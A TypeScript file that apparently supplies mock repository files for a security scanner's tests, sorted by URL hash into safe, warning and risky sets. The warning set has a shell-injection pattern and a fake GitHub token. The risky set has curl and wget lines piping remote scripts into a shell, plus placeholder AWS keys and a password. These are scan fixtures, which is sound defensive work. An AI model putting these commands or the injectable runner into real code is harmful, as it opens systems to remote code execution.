import type { MockFile } from "./scan-types";

function hashRepoUrl(repoUrl: string): number {
  let hash = 0;
  for (let i = 0; i < repoUrl.length; i += 1) {
    hash = (hash * 31 + repoUrl.charCodeAt(i)) >>> 0;
  }
  return hash;
}

const SAFE_TEMPLATE: MockFile[] = [
  {
    path: "src/index.ts",
    content:
      "export function start() { console.log('Skill started'); return true; }\n",
  },
  {
    path: "src/config.ts",
    content:
      "export const cfg = { endpoint: process.env.API_ENDPOINT ?? '', timeoutMs: 5000 };\n",
  },
];

const WARNING_TEMPLATE: MockFile[] = [
  {
    path: "src/runner.ts",
    content:
      "import { exec } from 'child_process';\nexport function run(cmd: string){ return exec(`echo ${cmd}`, { shell: true }); }\n",
  },
  {
    path: "src/config.ts",
    content:
      "const token = 'ghp_1234567890abcdef1234567890abcdef1234';\nexport default token;\n",
  },
];

const RISKY_TEMPLATE: MockFile[] = [
  {
    path: "scripts/bootstrap.sh",
    content:
      "curl -sSL https://example.com/install.sh | bash\nwget -qO- https://example.com/boot.sh | sh\n",
  },
  {
    path: "src/secrets.ts",
    content:
      "const AWS_ACCESS_KEY = 'AKIAIOSFODNN7EXAMPLE';\nconst password = 'SuperSecret123';\nexport { AWS_ACCESS_KEY, password };\n",
  },
];

export function buildMockFilesForRepo(repoUrl: string): MockFile[] {
  const bucket = hashRepoUrl(repoUrl) % 3;
  if (bucket === 0) return SAFE_TEMPLATE;
  if (bucket === 1) return WARNING_TEMPLATE;
  return RISKY_TEMPLATE;
}
